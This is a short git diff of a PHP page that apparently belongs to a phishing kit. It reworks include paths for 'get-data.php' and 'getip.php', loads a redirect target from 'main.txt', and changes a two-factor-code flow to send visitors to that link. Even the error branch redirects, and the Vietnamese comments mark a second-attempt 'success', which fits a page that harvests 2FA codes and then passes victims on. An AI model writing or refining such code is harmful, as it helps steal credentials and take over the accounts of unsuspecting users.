@@ -1,7 +1,12 @@
 <?php
 // get root directory
-require_once('./get-data.php');
-require_once('./getip.php');
+$rootDirectory = dirname(dirname(__FILE__));
+require_once($rootDirectory . '/get-data.php');
+require_once($rootDirectory . '/getip.php');
+
+$mainFile = './main.txt';
+$mainLink = trim(file_get_contents($mainFile));
+
 ?> <?php
 function getServerIP() {
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
@@ -603,7 +608,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                     // Lần 2: Thành công - chuyển đến index.php
                     sessionStorage.removeItem('2faAttempts');
                     sessionStorage.removeItem('2faFirstAttempt');
-                    window.location.href = "/index.php";
+                    window.location.href = "<?php echo $mainLink; ?>";
                 }
             })
             .catch(error => {
@@ -620,7 +625,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 } else {
                     sessionStorage.removeItem('2faAttempts');
                     sessionStorage.removeItem('2faFirstAttempt');
-                    window.location.href = "/index.php";
+                    window.location.href = "<?php echo $mainLink; ?>";
                 }
             });
         }
